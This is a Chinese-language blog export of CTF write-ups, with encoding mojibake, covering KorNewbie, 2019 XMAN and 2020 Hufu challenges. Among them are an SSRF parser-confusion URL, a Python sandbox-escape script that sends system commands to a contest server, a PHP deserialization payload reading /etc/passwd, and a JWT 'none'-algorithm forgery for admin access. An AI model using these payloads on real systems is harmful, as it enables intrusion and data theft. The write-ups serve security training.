alt="image.png"></p><p>è¿™å°±å¾ˆå®¹æ˜“æƒ³åˆ°phpé‡Œé¢libcurlå’Œparaseçš„å·®å¼‚</p><blockquote><p>parse_urlä¸libcurlå¯¹ä¸urlçš„è§£æå·®å¼‚å¯èƒ½å¯¼è‡´ssrfå½“urlä¸­æœ‰å¤šä¸ª@ç¬¦å·æ—¶ï¼Œparse_urlä¸­è·å–çš„hostæ˜¯æœ€åä¸€ä¸ª@ç¬¦å·åé¢çš„hostï¼Œè€Œlibcurlåˆ™æ˜¯è·å–çš„ç¬¬ä¸€ä¸ª@ç¬¦å·ä¹‹åçš„ã€‚å› æ­¤å½“ä»£ç å¯¹<a href="http://user@eval.com:80@baidu.comè¿›è¡Œè§£ææ—¶ï¼ŒPHPè·å–çš„hostæ˜¯baidu.comæ˜¯å…è®¸è®¿é—®çš„åŸŸåï¼Œè€Œæœ€åè°ƒç”¨libcurlè¿›è¡Œè¯·æ±‚æ—¶åˆ™æ˜¯è¯·æ±‚çš„eval.comåŸŸåï¼Œå¯ä»¥é€ æˆssrfç»•è¿‡æ­¤å¤–å¯¹äºhttps://evil@baidu.comè¿™æ ·çš„åŸŸåè¿›è¡Œè§£ææ—¶,phpè·å–çš„hostæ˜¯evil@baidu.comï¼Œä½†æ˜¯libcurlè·å–çš„hostå´æ˜¯evil.com" target="_blank" rel="noopener">http://user@eval.com:80@baidu.comè¿›è¡Œè§£ææ—¶ï¼ŒPHPè·å–çš„hostæ˜¯baidu.comæ˜¯å…è®¸è®¿é—®çš„åŸŸåï¼Œè€Œæœ€åè°ƒç”¨libcurlè¿›è¡Œè¯·æ±‚æ—¶åˆ™æ˜¯è¯·æ±‚çš„eval.comåŸŸåï¼Œå¯ä»¥é€ æˆssrfç»•è¿‡æ­¤å¤–å¯¹äºhttps://evil@baidu.comè¿™æ ·çš„åŸŸåè¿›è¡Œè§£ææ—¶,phpè·å–çš„hostæ˜¯evil@baidu.comï¼Œä½†æ˜¯libcurlè·å–çš„hostå´æ˜¯evil.com</a> </p><p>from  <a href="https://paper.seebug.org/561" target="_blank" rel="noopener">https://paper.seebug.org/561</a> </p></blockquote><p>æ„é€ url:<code>user@4399.com@normalflag.iwinv.net</code>(æˆ‘æ˜¯æ¥å¸®4399æ‰“å¹¿å‘Šçš„:v:)â€‹</p><p>KorNewbie{H0$7_$P1it_A774cK_U$3s_N0RM^liZ47ioN&amp;##$%%!}</p><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="catch-me"><a href="#catch-me" class="headerlink" title="catch me"></a>catch me</h3><p>åˆ©ç”¨å·¥å…·é€å¸§æŸ¥çœ‹ï¼ŒæŠŠæ¯ä¸ªå­å‡ºç°çš„ä½ç½®è®°å½•è½¬æˆasciiç å¾—åˆ°flag</p><p>KorNewbie{w0w_e4g1e_3y3}</p><h3 id="BiMilCode"><a href="#BiMilCode" class="headerlink" title="BiMilCode"></a>BiMilCode</h3><p><img src="http://ww1.sinaimg.cn/large/006pWR9aly1g8kovw3cl4j30e704pt8u.jpg" alt="image.png"></p><p>åˆšå¼€å§‹é¢˜ç›®è¯´è¦encodeã€‚ç»“æœè¢«è¿™ä¸ªè¯¯è§£æäº†ä¸€ä¸ªå°æ—¶æ‰å‘ç°æ˜¯decode</p><p>è§‚å¯Ÿå‘ç°ä¸€ä¸ªå­—ç¬¦ä¼šè¢«ç¼–ç æˆ2ä½çš„16è¿›åˆ¶çš„æ•°æ®</p><p>è®¤çœŸè§‚å¯Ÿå‘ç°ç¼–ç æ–¹å¼è¿˜å’Œä½ç½®æœ‰å…³ï¼Œä½†æ˜¯ç›¸åŒçš„ä½ç½®ç¼–ç æ–¹å¼ç›¸åŒ,è€Œä¸”åªæ˜¯å¯¹asciiç è¿›è¡Œç§»ä½</p><p>ä¹Ÿå°±æ˜¯è¯´,åœ¨åŒä¸€ä¸ªä¼šè¯é‡Œ,æˆ‘ä»¬å¯ä»¥é€šè¿‡asciiç çš„å·®å€¼æ¥å¾—åˆ°æ¥è®¡ç®—å‡ºé¢˜ç›®ç»™å‡ºçš„ç¼–ç åçš„å­—ç¬¦ä¸²</p><p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8kp8m10vej30ep058jrl.jpg" alt="image.png"></p><pre><code class="python">s2=&#39;45 dd 97 38 62 6c 62 85&#39;.split(&#39; &#39;)s1=&#39;3a 93 78 3a 6c 63 3a 63&#39;.split(&#39; &#39;)print(s1)print(s2)for i in range(len(s1)):    print(chr(ord(&#39;0&#39;)+int(s1[i],16)-int(s2[i],16)),end=&#39;&#39;)</code></pre><p>KorNewbie{Nace_I_believed_it}</p><h2 id="Forensic"><a href="#Forensic" class="headerlink" title="Forensic"></a>Forensic</h2><h3 id="find-the-plain"><a href="#find-the-plain" class="headerlink" title="find the plain"></a>find the plain</h3><p>é¢˜ç›®æè¿°</p><blockquote><p>Alpha teamâ€™s whistleblower captured a packet that leaked internal information to the outside using ftp internal confidential data.</p><p>Analyze the packet and flag the password and information obtained for the ftp connection!</p><p>flag format : KorNewbie{password_yougetinformation}</p><p>â€» If there is a hash value, it will be md5.</p></blockquote><p>ç”¨<code>(!frame.len== 1518) &amp;&amp;(!frame.len== 1514)&amp;&amp; (! ip.addr==192.229.232.240) &amp;&amp; (not tcp.stream==2) &amp;&amp; (not tcp.stream==0)&amp;&amp; (not tcp.stream==1)</code></p><p>è¿‡æ»¤æ‰¾åˆ°ftpä¼ è¾“æ–‡ä»¶å’Œè´¦å·å¯†ç </p><p>password:root</p><p>badguy.txt</p><pre><code>7J2067O06rKMIOyVjO2MjO2MgOydmCDsi6Dsg4HsoJXrs7TripQg67CR7J2YIOyjvOyGjOyXkCDrqqjrkZAg64u07JWE64aT7JWY64SkLiDqsbTtiKzrpbwg67mM7KeA7JuM7YSwLi4gDQpodHRwczovL3Bhc3RlYmluLmNvbS83MHlER2lSUw==</code></pre><p>decodeå¾—åˆ°</p><pre><code>ì´ë³´ê²Œ ì•ŒíŒŒíŒ€ì˜ ì‹ ìƒì •ë³´ëŠ” ë°‘ì˜ ì£¼ì†Œì— ëª¨ë‘ ë‹´ì•„ë†“ì•˜ë„¤. ê±´íˆ¬ë¥¼ ë¹Œì§€ì›Œí„°.. //alphaç»„çš„ä¸ªäººä¿¡æ¯å…¨éƒ¨æ”¾åœ¨ä¸‹é¢çš„åœ°å€é‡Œã€‚ç¥ä½ æˆåŠŸ..https://pastebin.com/70yDGiRS</code></pre><p><code>k459iki6m5j094m2lmkhjmi9527l81ml</code></p><p>é¢˜ç›®æç¤ºå¾—åˆ°çš„ä¸€ä¸ªä¿¡æ¯æ˜¯md5</p><p>æ‰€ä»¥å¯¹è¿™ä¸ªè¿›è¡Œå‡¯æ’’å¯†ç è§£å¯†å¾—åˆ°<code>d459bdb6f5c094f2efdacfb9527e81fe</code></p><p>åé¢å‘ç°<img src="http://ww1.sinaimg.cn/large/006pWR9aly1g8k0vd6qapj30ue015gli.jpg" alt="image.png"></p><p>è¿™é‡Œä¹Ÿæç¤ºäº†å‡¯æ’’åŠ å¯†</p><p>ä½†æ˜¯ç”¨å›½å†…çš„md5è§£å¯†ç½‘ç«™æ— è®ºå¦‚ä½•ä¹Ÿç ´ä¸äº†</p><p>ç”¨æœé²œè¯­æœäº†ä¸€ä¸‹å°±è§£å¯†äº†</p><p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8k0ww99j0j30j6036t8w.jpg" alt="image.png"></p><p>KorNewbie{root_IronDragon}</p><p>â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦</p><p>è¿™æ˜¯ä¸ªæ¢—å—.</p><h3 id="chat"><a href="#chat" class="headerlink" title="chat"></a>chat</h3><p>é¢˜ç›®æè¿°</p><blockquote><p>Confidential information came and went through chat. Find the email of the user who used the chat. </p></blockquote><p>user:NewbieCTF2019</p><p>åœ¨youtubeæ‰¾åˆ°ä¸€ä¸ªå¥½ç©çš„é‡ç½®å¯†ç çš„æ–¹æ³•</p><p> <a href="https://www.youtube.com/watch?v=YBFAzK9mgNI" target="_blank" rel="noopener">https://www.youtube.com/watch?v=YBFAzK9mgNI</a> </p><p>æ ¹æ®è¿™ä¸ªæ¥é‡ç½®å¯†ç </p><p>é‡ç½®å¯†ç åçœ‹ç€æ£’å­æ–‡æˆ‘æ˜¯æ‡µé€¼çš„(åŒä¼´+1)</p><p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8kph085tzj31gw0see6k.jpg" alt="image.png"></p><p>æ ¹æ®é¢˜ç›®æç¤ºèŠå¤©è½¯ä»¶ç†æ‰€å½“ç„¶çš„ç›¯ä¸Šäº†kakao</p><p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8kppnap1sj30wj0b60u7.jpg" alt="image.png"></p><p>è·‘åˆ°æ–‡ä»¶å¤¹é‡Œç¿»ä¸€ç¿»(ä¹Ÿå¯ä»¥å†™ä¸ªè„šæœ¬/fad)</p><p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8kpqxb2njj30tz0j8my5.jpg" alt="image.png"></p><p>æœ€åæ‹¿åˆ°flag</p><p><code>KorNewbie{renek@it-simple.net}</code></p><h3 id="rec"><a href="#rec" class="headerlink" title="rec"></a>rec</h3><p>è¿™é¢˜è·Ÿè¿›å»è°ƒè¯•ä¹Ÿæ²¡çœ‹åˆ°å•¥ï¼Œæƒ³æ¥æƒ³å»é˜²æ­¢å–è¯é¢˜çš„åœ°æ–¹æ€ä¹ˆä¹Ÿä¸å¯èƒ½æ˜¯é€†å‘å•¥çš„ã€</p><p>äºæ˜¯å°±å¼€å§‹ç”¨binwalk,stringsâ€¦..</p><p>æœ€åç¿»ä¸€ç¿»æ‰¾åˆ°äº†segæ®µâ€¦â€¦â€¦â€¦</p><p>åœ¨segæ®µæ‰¾åˆ°</p><p><img src="http://ww1.sinaimg.cn/large/006pWR9aly1g8k2xe25wlj30io0gbdio.jpg" alt="image.png"></p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="http://blog.ccreater.top/2020/04/20/nbctf/">http://blog.ccreater.top/2020/04/20/nbctf/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> æ¯”èµ› </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019xmanä¸ªäººæ’ä½èµ›wp</title>
      <link href="/2020/04/20/2019xman%E4%B8%AA%E4%BA%BA%E6%8E%92%E4%BD%8D%E8%B5%9Bwp/"/>
      <url>/2020/04/20/2019xman%E4%B8%AA%E4%BA%BA%E6%8E%92%E4%BD%8D%E8%B5%9Bwp/</url>
      
        <content type="html"><![CDATA[<h2 id="escape"><a href="#escape" class="headerlink" title="escape"></a>escape</h2><p>æ”¶è·:äº†è§£äº†pythonæ²™ç®±é€ƒé€¸è¿™ç§ç±»å‹</p><p>getattr:å¯¹æ²™ç®±é€ƒé€¸æœ‰å¾ˆå¤§ä½œç”¨</p><p>list(s)è·å¾—å­—ç¬¦é›†,å¯ä»¥ç”¨æ¥ç»•è¿‡å¼•å·é™åˆ¶</p><p>è¯•äº†ä¸€ä¸‹system</p><pre><code class="python">banned=  [&quot;&#39;&quot;, &#39;&quot;&#39;, &#39;.&#39;, &#39;reload&#39;, &#39;open&#39;, &#39;input&#39;, &#39;file&#39;, &#39;if&#39;, &#39;else&#39;, &#39;eval&#39;, &#39;exit&#39;, &#39;import&#39;, &#39;quit&#39;, &#39;exec&#39;, &#39;code&#39;, &#39;const&#39;, &#39;vars&#39;, &#39;str&#39;, &#39;chr&#39;, &#39;ord&#39;, &#39;local&#39;, &#39;global&#39;, &#39;join&#39;, &#39;format&#39;, &#39;replace&#39;, &#39;translate&#39;, &#39;try&#39;, &#39;except&#39;, &#39;with&#39;, &#39;content&#39;, &#39;frame&#39;, &#39;back&#39;]</code></pre><p>å‘ç°å¼•å·å’Œç‚¹éƒ½è¢«è¿‡æ»¤äº†,ä¸è¿‡æç¤ºè¯´</p><pre><code class="python">def hello():   os.system(&quot;echo hello&quot;)</code></pre><p>è¯´æ˜æ˜¯å¯ä»¥é€šè¿‡è°ƒç”¨systemæ¥å®Œæˆ,æ¥ä¸‹æ¥å°±æ˜¯æƒ³åŠæ³•å¾—åˆ°systemå‡½æ•°äº†</p><p>è€Œå¼•å·è¢«è¿‡æ»¤å¯ä»¥ç”¨å­—ç¬¦ä¸²sé‡Œçš„å€¼æ¥ç»•è¿‡</p><pre><code class="python">#è€ƒè™‘è¿™æ ·æ¥a=getattr(os,&#39;system&#39;)a(&quot;å‘½ä»¤&quot;)</code></pre><pre><code class="python">def get_str(string):    result=&#39;&#39;    for i in string:        result+=&#39;table[&#39;+str(table.index(i))+&#39;]+&#39;    return result[:-1]conn=remote(&#39;47.97.253.115&#39;,10005)conn.sendline(&#39;table=list(s)&#39;)conn.sendline(&#39;sys=&#39;+get_str(&#39;system&#39;))conn.sendline(&#39;fun=getattr(os,sys)&#39;)while 1:        command=input(&#39;(www):$&#39;)        new_com=&#39;fun(&#39;+get_str(command)+&#39;)&#39;        conn.sendline(new_com)        print(conn.recvuntil(&#39;&gt;&gt;&gt;&#39;))conn.close()</code></pre><p>flag{4EEAA88DA0B3207862D2E4876AF84A3D}</p><h2 id="strange-ssid"><a href="#strange-ssid" class="headerlink" title="strange_ssid"></a>strange_ssid</h2><p>è¿™é¢˜æ˜¯ç»“æŸå¬åˆ«äººè®²çš„</p><p>æ‰€æœ‰çš„æ•°æ®éƒ½æ˜¯32ä¸ªå­—ç¬¦</p><p>æ‰€ä»¥çŒœæµ‹æ˜¯md5åŠ å¯†</p><p>æ‰¾å‡ºç¬¦åˆmd5æ ¼å¼çš„æ•°æ®</p><p>68dffd5a1be838b5326209714f7ea7a5</p><p>è§£å¯†åæäº¤flag{n3k0}å¤±è´¥</p><p>ç›´æ¥æäº¤flag{68dffd5a1be838b5326209714f7ea7a5}è¯•è¯•</p><p>æˆåŠŸ</p><h2 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a><strong>ezphp</strong></h2><p>æ”¶è·:çŸ¥é“äº†curl_exec æœ¬åœ°æ–‡ä»¶è¯»å–</p><pre><code class="php">&lt;?phpclass Hello {    protected $a;    function test() {        $b = strpos($this-&gt;a, &#39;flag&#39;);        if($b) {            die(&quot;Bye!&quot;);        }        $c = curl_init();        curl_setopt($c, CURLOPT_URL, $this-&gt;a);        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);        curl_setopt($c, CURLOPT_CONNECTTIMEOUT, 5);        echo curl_exec($c);    }    function __destruct(){        $this-&gt;test();    }}if (isset($_GET[&quot;z&quot;])) {    unserialize($_GET[&quot;z&quot;]);} else {    highlight_file(__FILE__);}</code></pre><p>curl_exec+ååºåˆ—åŒ–</p><p>è¯•äº†ä¸‹æœ¬åœ°æ–‡ä»¶è¯»å–</p><p>O:5:â€Helloâ€:1:{s:1:â€aâ€;s:27:â€file://localhost/etc/passwdâ€;}</p><p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g5uwj7l0c4j30wp0ax407.jpg" alt="image1967"></p><p>é¢˜ç›®è¿‡æ»¤flagå­—ç¬¦</p><p>è¯´æ˜æˆ‘ä»¬flagå°±åœ¨flagæ–‡ä»¶é‡Œ</p><p>è°·æ­Œçœ‹äº†å¥½ä¹…ï¼Œåæ¥çœ‹ä¸€é“åˆcurl_execçš„é¢˜ç›®ï¼Œè·å¾—äº†urläºŒæ¬¡ç¼–ç çš„æ€è·¯</p><p>æœ€åçš„payload:</p><p><a href="http://47.97.253.115:10006/?z=O:5:%22Hello%22:1:{s:1:%22a%22;s:23:%22file://localhost/%2566lag%22;}" target="_blank" rel="noopener">http://47.97.253.115:10006/?z=O:5:%22Hello%22:1:{s:1:%22a%22;s:23:%22file://localhost/%2566lag%22;}</a></p><p>è¿™é‡Œæœ‰ä¸€äº›å‘å°±æ˜¯:</p><ol><li><p>ä½ ä¸çŸ¥é“flagæ–‡ä»¶åœ¨å“ªä¸ªæ–‡ä»¶å¤¹,ç»“æœæœ€åå°±åœ¨æ ¹ç›®å½•ã€‚ã€‚</p></li><li><p>å› ä¸ºæ˜¯äºŒæ¬¡ç¼–ç æ‰€ä»¥è¦æ³¨æ„å­—ç¬¦ä¸²çš„é•¿åº¦</p></li></ol><h2 id="onionâ€™s-secret"><a href="#onionâ€™s-secret" class="headerlink" title="onionâ€™s_secret"></a><strong>onionâ€™s_secret</strong></h2><p>ä¸‹è½½å¾—åˆ°ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œå¸¸è§„çš„æ£€æŸ¥èµ°ä¸€é</p><p>å‘ç°onion.jpgæ–‡ä»¶å°¾åè¿˜æœ‰æ•°æ®</p><p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g5uwp2ulyrj30jj079dif.jpg" alt="image2357"></p><p>zipæ ¼å¼,getä¸€ä¸ªæ–°çš„åŠ å¯†å‹ç¼©åŒ…</p><p>å¯†ç åœ¨hinté‡Œæœ‰æç¤º</p><p>æ¥ä¸‹æ¥å°±æ˜¯å¾ˆæ™®é€šçš„å†™pythonäº†</p><pre><code class="python">import zipfiledef burp(filename,hint):    password=&#39;&#39;    i=0    for i in range(32,128):        password=hint.replace(&#39;?&#39;,chr(i))        with zipfile.ZipFile(filename) as myzip:            try :                print(&quot;è§£å¯†:&quot;+filename+&quot;:&quot;+password)                myzip.read(&#39;onion.zip&#39;,pwd=bytes(password,encoding=&#39;ascii&#39;))                break                return password            except RuntimeError:                 print(&quot;è§£å¯†å¤±è´¥&quot;)            except FileNotFoundError:                input(&#39;è¿‡æ¥åº·åº·&#39;)            except zipfile.zlib.error:                print(&quot;è·³è¿‡&quot;)    if i==127:        print(&quot;çˆ†ç ´å¤±è´¥&quot;)        exit()    print(&#39;çˆ†ç ´æˆåŠŸ&#39;+password)    return passworddef writebyte(bbyte,filename):    f=open(filename,&#39;wb&#39;)    f.write(bbyte)    f.close()def readbyte(filename):    f=open(filename,&#39;rb&#39;)    bbyte=f.read()    f.close()    return bbytenullbyte=b&#39;&#39;while 1:    f=open(&#39;temp.txt&#39;,&#39;r&#39;)    hint=f.read()[12:]    f.close()    pwd=burp(&#39;onion1.zip&#39;,hint)    with zipfile.ZipFile(&#39;onion1.zip&#39;) as myzip:        str=myzip.read(&#39;onion.zip&#39;,pwd=bytes(pwd,encoding=&#39;ascii&#39;))        writebyte(str,&quot;temp.zip&quot;)        str=myzip.read(&#39;hint.txt&#39;,pwd=bytes(pwd,encoding=&#39;ascii&#39;))        writebyte(str,&quot;temp.txt&quot;)    writebyte(readbyte(&#39;temp.zip&#39;),&#39;onion1.zip&#39;)</code></pre><h2 id="commom-encrypt"><a href="#commom-encrypt" class="headerlink" title="commom_encrypt"></a><strong>commom_encrypt</strong></h2><p>è¯»ä»£ç å°±å®Œäº‹äº†</p><pre><code class="python">def encrypt(data,groupnums):    a=[]    b=[]    section=int(len(data)/groupnums)    for i in range(0,len(data),section):        a.append(data[i:i+section])    for i in range(section):        for j in range(groupnums):            b.append(a[j][i])    cipher=(&#39;&#39;.join(chr(ord(b[i])^i) for i in range(len(b))))    return cipherdef decrypt(data):    result=[]    for i in range(1,len(data)+1):        result.append(encrypt(data,i))    return resultmay_r=decrypt(&#39;f^n2ekass:iy~&gt;w|`ef&quot;${Ip)8if&#39;)for i in may_r:    print(i[::2]+i[1::2])</code></pre><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="http://blog.ccreater.top/2020/04/20/2019xmanä¸ªäººæ’ä½èµ›wp/">http://blog.ccreater.top/2020/04/20/2019xmanä¸ªäººæ’ä½èµ›wp/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> æ¯”èµ› </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020æ•°å­—ä¸­å›½åˆ›æ–°å¤§èµ›-è™ç¬¦ç½‘ç»œå®‰å…¨</title>
      <link href="/2020/04/20/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B-%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
      <url>/2020/04/20/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B-%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="easy-login"><a href="#easy-login" class="headerlink" title="easy_login"></a>easy_login</h3><p>åœ¨static/js/app.jsä¸­å‘ç°</p><pre><code class="javascript">/** *  æˆ–è®¸è¯¥ç”¨ koa-static æ¥å¤„ç†é™æ€æ–‡ä»¶ *  è·¯å¾„è¯¥æ€ä¹ˆé…ç½®ï¼Ÿä¸ç®¡äº†å…ˆå¡«ä¸ªæ ¹ç›®å½•XD */</code></pre><p>äºæ˜¯ç›´æ¥è®¿é—®app.js</p><pre><code class="javascript">const Koa = require(&#39;koa&#39;);const bodyParser = require(&#39;koa-bodyparser&#39;);const session = require(&#39;koa-session&#39;);const static = require(&#39;koa-static&#39;);const views = require(&#39;koa-views&#39;);const crypto = require(&#39;crypto&#39;);const { resolve } = require(&#39;path&#39;);const rest = require(&#39;./rest&#39;);const controller = require(&#39;./controller&#39;);const PORT = 80;const app = new Koa();app.keys = [crypto.randomBytes(16).toString(&#39;hex&#39;)];global.secrets = [];app.use(static(resolve(__dirname, &#39;.&#39;)));app.use(views(resolve(__dirname, &#39;./views&#39;), {  extension: &#39;pug&#39;}));app.use(session({key: &#39;sses:aok&#39;, maxAge: 86400000}, app));// parse request body:app.use(bodyParser());// prepare restful serviceapp.use(rest.restify());// add controllers:app.use(controller());app.listen(PORT);console.log(`app started at port ${PORT}...`);</code></pre><p>ç„¶årest.js</p><pre><code class="javascript">module.exports = {    APIError: function (code, message) {        this.code = code || &#39;internal:unknown_error&#39;;        this.message = message || &#39;&#39;;    },    restify: () =&gt; {        const pathPrefix = &#39;/api/&#39;;        return async (ctx, next) =&gt; {            if (ctx.request.path.startsWith(pathPrefix)) {                ctx.rest = data =&gt; {                    ctx.response.type = &#39;application/json&#39;;                    ctx.response.body = data;                };                try {                    await next();                } catch (e) {                    ctx.response.status = 400;                    ctx.response.type = &#39;application/json&#39;;                    ctx.response.body = {                        code: e.code || &#39;internal_error&#39;,                        message: e.message || &#39;&#39;                    };                }            } else {                await next();            }        };    }};</code></pre><p>controller.js</p><pre><code class="javascript">const fs = require(&#39;fs&#39;);function addMapping(router, mapping) {    for (const url in mapping) {        if (url.startsWith(&#39;GET &#39;)) {            const path = url.substring(4);            router.get(path, mapping[url]);        } else if (url.startsWith(&#39;POST &#39;)) {            const path = url.substring(5);            router.post(path, mapping[url]);        } else {            console.log(`invalid URL: ${url}`);        }    }}function addControllers(router, dir) {    fs.readdirSync(__dirname + &#39;/&#39; + dir).filter(f =&gt; {        return f.endsWith(&#39;.js&#39;);    }).forEach(f =&gt; {        const mapping = require(__dirname + &#39;/&#39; + dir + &#39;/&#39; + f);        addMapping(router, mapping);    });}module.exports = (dir) =&gt; {    const controllers_dir = dir || &#39;controllers&#39;;    const router = require(&#39;koa-router&#39;)();    addControllers(router, controllers_dir);    return router.routes();};</code></pre><p>fuzz controllersç›®å½•å¾—åˆ°</p><p>api.js</p><pre><code class="javascript">const crypto = require(&#39;crypto&#39;);const fs = require(&#39;fs&#39;)const jwt = require(&#39;jsonwebtoken&#39;)const APIError = require(&#39;../rest&#39;).APIError;module.exports = {    &#39;POST /api/register&#39;: async (ctx, next) =&gt; {        const {username, password} = ctx.request.body;        if(!username || username === &#39;admin&#39;){            throw new APIError(&#39;register error&#39;, &#39;wrong username&#39;);        }        if(global.secrets.length &gt; 100000) {            global.secrets = [];        }        const secret = crypto.randomBytes(18).toString(&#39;hex&#39;);        const secretid = global.secrets.length;        global.secrets.push(secret)        const token = jwt.sign({secretid, username, password}, secret, {algorithm: &#39;HS256&#39;});        ctx.rest({            token: token        });        await next();    },    &#39;POST /api/login&#39;: async (ctx, next) =&gt; {        const {username, password} = ctx.request.body;        if(!username || !password) {            throw new APIError(&#39;login error&#39;, &#39;username or password is necessary&#39;);        }        const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;        const sid = JSON.parse(Buffer.from(token.split(&#39;.&#39;)[1], &#39;base64&#39;).toString()).secretid;        console.log(sid)        if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) {            throw new APIError(&#39;login error&#39;, &#39;no such secret id&#39;);        }        const secret = global.secrets[sid];        const user = jwt.verify(token, secret, {algorithm: &#39;HS256&#39;});        const status = username === user.username &amp;&amp; password === user.password;        if(status) {            ctx.session.username = username;        }        ctx.rest({            status        });        await next();    },    &#39;GET /api/flag&#39;: async (ctx, next) =&gt; {        if(ctx.session.username !== &#39;admin&#39;){            throw new APIError(&#39;permission error&#39;, &#39;permission denied&#39;);        }        const flag = fs.readFileSync(&#39;/flag&#39;).toString();        ctx.rest({            flag        });        await next();    },    &#39;GET /api/logout&#39;: async (ctx, next) =&gt; {        ctx.session.username = null;        ctx.rest({            status: true        })        await next();    }};</code></pre><p>view.js</p><pre><code class="javascript">module.exports = {    &#39;GET /&#39;: async (ctx, next) =&gt; {        ctx.status = 302;            ctx.redirect(&#39;/home&#39;);    },    &#39;GET /login&#39;: async (ctx, next) =&gt; {        if(ctx.session.username) {            ctx.status = 302;                await ctx.redirect(&#39;/home&#39;);        } else {            await ctx.render(&#39;login&#39;);            await next();        }    },    &#39;GET /register&#39;: async (ctx, next) =&gt; {        if(ctx.session.username) {            ctx.status = 302;                await ctx.redirect(&#39;/home&#39;);        } else {            await ctx.render(&#39;register&#39;);            await next();        }    },    &#39;GET /home&#39;: async (ctx, next) =&gt; {        if(!ctx.session.username) {            ctx.status = 302;                await ctx.redirect(&#39;/login&#39;);        } else {            await ctx.render(&#39;home&#39;, {                username: ctx.session.username,            });            await next();        }    }};</code></pre><p>é˜…è¯»ä»£ç å‘ç°ï¼š</p><pre><code class="javascript">const sid = JSON.parse(Buffer.from(token.split(&#39;.&#39;)[1], &#39;base64&#39;).toString()).secretid;if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) {            throw new APIError(&#39;login error&#39;, &#39;no such secret id&#39;);        }const secret = global.secrets[sid];//éªŒè¯ä¹‹å‰</code></pre><p>æˆ‘ä»¬å¯ä»¥æ§åˆ¶sidæ¥é€‰æ‹©ä»»æ„çš„å¯†é’¥</p><p> node çš„jsonwebtokenåº“å­˜åœ¨ä¸€ä¸ªç¼ºé™·ï¼Œä¹Ÿæ˜¯jwtçš„å¸¸è§æ”»å‡»æ‰‹æ³•ï¼Œå½“ç”¨æˆ·ä¼ å…¥jwt secretä¸ºç©ºæ—¶ jsonwebtokenä¼šé‡‡ç”¨algorithm noneè¿›è¡Œè§£å¯† </p><p>æˆ‘ä»¬ä»¤<code>sid=false</code>,åˆ™å¯ä»¥é€šè¿‡</p><pre><code>if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) {            throw new APIError(&#39;login error&#39;, &#39;no such secret id&#39;);        }</code></pre><p>çš„éªŒè¯ï¼Œä¸”<code>global.secrets[sid]=undefined</code></p><p>æœ€åçš„payload</p><pre><code class="python">import jwtimport jsona=json.loads(&#39;&#39;&#39;{        &quot;secretid&quot;: false,        &quot;username&quot;:&quot;admin&quot;,        &quot;password&quot;: &quot;admin&quot;,        &quot;iat&quot;: 1587310401}&#39;&#39;&#39;)print(jwt.encode(a, key=&quot;&quot;, algorithm=&#39;none&#39;))</code></pre><h3 id="just-escape"><a href="#just-escape" class="headerlink" title="just_escape"></a>just_escape</h3><pre><code>æ•°å­¦è¿ç®—code: (2+6-7)/3run online: /run.php?code=(2%2b6-7)/3;Ouput: 0.3333333333333333æ³¨æ„ç¼–ç  =.=æ—¶é—´æˆ³code: new Date();run online: /run.php?code=new%20Date();Ouput: Fri Nov 22 2019 15:39:22 GMT+0800 (China Standard Time)çœŸçš„æ˜¯ PHP å˜›</code></pre><p>åˆšå¼€å§‹è¿˜çœŸçš„ä»¥ä¸ºæ˜¯php,å†è¾“å…¥consoleçš„æ—¶å€™è¿”å› <code>[object Object]</code>ï¼Œè¿™é¢˜åº”è¯¥æ˜¯nodejs</p><p>åœ¨ç½‘ä¸Šæ‰¾åˆ°<a href="https://blog.zeddyu.info/2019/02/14/Hackim-2019/#BabyJS" target="_blank" rel="noopener">ç±»ä¼¼çš„é¢˜ç›®</a></p><p>åœ¨vm2çš„issueä¸­æ‰¾åˆ° <a href="https://github.com/patriksimek/vm2/issues/225" target="_blank" 